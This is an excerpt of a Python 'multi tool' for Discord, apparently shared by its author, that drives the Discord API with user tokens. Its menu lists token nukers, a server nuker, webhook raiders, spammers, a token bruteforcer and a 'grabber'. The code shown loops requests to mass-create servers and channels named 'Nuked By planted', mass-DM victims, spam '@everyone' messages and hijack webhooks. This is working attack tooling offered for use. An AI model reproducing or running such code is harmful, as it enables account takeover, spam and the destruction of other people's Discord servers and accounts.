# Multi tool made by Plantedcosine7#2309
...
def tool():
  ...
  def options1():
    ...
    os.system('cls' if os.name=='nt' else 'clear')
    ctypes.windll.kernel32.SetConsoleTitleW("planted Multi Tool <3")
    print(f'''
████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗███╗   ███╗ █████╗ ███╗   ██╗ █████╗  ██████╗ ███████╗██████╗
╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝ ██╔════╝██╔══██╗
   ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║██╔████╔██║███████║██╔██╗ ██║███████║██║  ███╗█████╗  ██████╔╝
   ...
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
    ''')                           
    print(Fore.CYAN + '╔══════════════════════════════╦══════════════════════════╦══════════════════════════════╦══════════════════════════╗')
    print(Fore.CYAN +f'║     {Fore.RED}token manager           {Fore.MAGENTA}║     {Fore.RED}gens          {Fore.MAGENTA}║     {Fore.RED}extr                   {Fore.MAGENTA}║     {Fore.RED}soon             {Fore.MAGENTA} ║')
    print(Fore.CYAN +'║     [1] TOKEN JOINER         ║     [9] TOKENS           ║     [15] TOKEN BRUTEFORCER   ║   [22]coming soon             ║')
    print(Fore.CYAN +   '║    [2] AIO WEBHOOK RAIDERS  ║     [10] NITRO           ║     [16] TOKEN CHECKER       ║  [23]coming soon         ║')
    print(Fore.CYAN +     '║     [3] AIO TOKEN NUKERS     ║     [11] PROXY           ║     [17] PFP CHANGER         ║                          ║')
    print(Fore.CYAN +     '║     [4] SERVER NUKER         ║     [12] GRABBER         ║     [18] BIO CHANGER         ║                          ║')
    print(Fore.CYAN+      '║     [5] SERVER SPAMMER       ║     [13] MEMBER IDS      ║     [19] HYPEQUAD CHANGER    ║                          ║')
    print(Fore.CYAN +     '║     [6] FRIEND SPAMMER       ║     [14] NAMES           ║     [20] TOKEN INFO          ║                          ║')
    print(Fore.CYAN +     '║     [7] ONLINER              ║                          ║     [21] TOKEN LOGIN         ║                          ║')
    print(Fore.CYAN +f'║     [8] TOKEN LEAVER         ║                          ║    {Fore.RED}[22] EXIT{Fore.RESET}{Fore.MAGENTA}                 ║                          ║')   
    print(Fore.CYAN + '║                              ║                          ║                             ║                          ║')
    print(Fore.CYAN + '╚══════════════════════════════╩══════════════════════════╩═════════════════════════════╩══════════════════════════╝')
    global options
  ...
  \033[31m  | | (_) |   <  __/ | | | | |\  | |_| |   <  __/ |   
    |_|\___/|_|\_\___|_| |_| |_| \_|\__,_|_|\_\___|_|   
      ...
      def servercreate():
          ...
          for x in range(15):
              try:
                r = requests.post(url,headers=header, json={'name':"Nuked By planted", 'icon':image})
      ...
      def channelmake():
          ...
          for b in range(length):
              for i in range(15):
                  ...
                  r = requests.post(url1, headers=header, json={'name':'nuked-by-planted'})
...
''')
    ...
    {Fore.RED}   | |_| | |_) | | | ||  __/ | | (_| | ||  __/ 
        ...
        for user in massdms:
          payload = {
            'content':'ACCOUNT NUKED BY planted'
          }
        ...
        def servercreate():
            ...
            for x in range(15):
                try:
                    r = requests.post(url2,headers=header, json={'name':"Nuked By planted", 'icon':image})
                    if r.status_code == 200 or 204 or 201:
                        print("Done!")
                        ids.append(r.json()['id'])
                    else:
...
{Fore.RED} | |___| | | |  __/ (__|   <  __/ |   
  ...
  def pfpmanager():
    ...
    if optionsforpfp == 1:
        image = input('What is the name of the image (Make sure the image is in the same folder as planted.py): ')
    ...
    \_/\_/ \___|_.__/|_| |_|\___/ \___/|_|\_\  \____|_|  \___|\__,_|\__\___/|_|   
        ...
        def spammer():
            ...
            for x in range(1):
                ...
                r = requests.post(url,headers=header,json={'name':'Nuked By planted'})
        ...
        print("Finished! Created 10 webhooks named *Nuked by planted* and with avatars named *planted*")
      ...
      def spammer():
          ...
          for x in range(1):
              ...
              for i in range(length):
                  ...
                  url1 = f'https://discord.com/api/v9/webhooks/{ids[i]}'
                  t = requests.patch(url1,headers=header2,json={'avatar':url2})
                  print("Succefully changed the avatar to a *planted* for the Webhooks!")
...
{Fore.RED} | |__| (_) | (_| | | | | |
 ...
 \033[31m| |___| | |  __/ (_| | | |_\__ \ 
  \____|_|  \___|\__,_|_|\__|___/
    ...
    ''')
    By = Fore.LIGHTBLACK_EX + 'planted made by plantedcosine7'
...
Channel ID: ''')
  ...
  def biochanger():
    ...
    if abtoptions in ['01','1']:
        ...
        bio3 = 'planted Multi Tool On Top <3'
        payload3 = {
            'bio':bio3
        }
    ...
    class UNuker:
        ...
        def SpamChannels(self, guild, name):
            while True:
                ...
                def sendmessage():
                    e = requests.post(f'https://discord.com/api/v9/channels/{id}/messages',headers=headerrs, json={'content':'@everyone @here NUKED BY planted'})
        ...
        async def NukeStart(self):
            ...
            e = requests.patch(url, headers=headerrs, json={'name':"Nuked By planted", 'icon':image})
